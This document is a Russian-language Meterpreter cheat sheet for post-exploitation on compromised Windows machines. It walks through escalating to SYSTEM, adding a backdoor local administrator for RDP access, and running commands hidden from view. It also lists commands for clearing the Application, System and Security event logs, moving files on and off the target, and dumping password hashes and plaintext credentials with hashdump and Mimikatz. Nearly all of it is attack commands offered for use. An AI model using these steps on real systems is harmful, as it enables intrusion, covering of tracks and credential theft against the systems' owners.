# meterpreter

### Основа

remote desktop: \
Подключаемся к поднятой сессии meterpreter \
msf> sessions \
msf> sessions -i 1 \
Создаем пользователя и добавляем его в админы \
meterpreter> sysinfo \
meterpreter> getuid \
meterpreter> getprivs \
meterpreter> getsystem \
meterpreter> shell \
win> net user myuser password /add \
win> net localgroup administrators myuser /add \
win> exit \
kali> rdesktop -u myuser -p password&#x20;

### Команды meterpreter

help - помощь\
background - возвращает сессию meterpreter в msf и переключает нас в msfconsole. Чтобы вернуться в meterpreter: sessions -i 1\
cat file.txt - чтение файла\
cd и pwd - изменение и вывод текущей директории\
clearev - удаление логов Application, System, и Security в Windows системе\
download file.txt - скачивание файла с целевой машины (можно скачивать папки)\
edit file.txt - редактирование файла с помощью vim\
execute -f \<cmd> - исполнение exe-файла, например: execute -f cmd.exe -i -H\
execute -f powershell -a "net users" -i -H - запуск команды через powershell в скрытом от просмотра (-H) неинтерактивном режиме (-i)\
getuid - текущий пользователь

Hashdump\
Дамп хешей из SAM: run post/windows/gather/hashdump\
Чтение хешей и паролей из памяти:\
kerberos\
msv

run post/windows/manage/migrate - миграция в другой процесс\
shell - cmd-оболочка\
upload some.exe c:\\\windows\system32 - загрузка на целевую машину файла

getsystem - получение прав системы\
sysinfo - информация о системе

Mimikatz\
load mimikatz - подгрузка mimikatz\
help mimikatz\
mimikatz\_command -f version\
mimikatz\_command -f fu:: - можем ввести что угодно, выведет список доступных модулей\
mimikatz\_command -f divers:: - информация по конкретному модулю\
Чтение хешей и паролей из памяти:\
mimikatz\_command -f samdump::hashes\
mimikatz\_command -f sekurlsa::searchPasswords
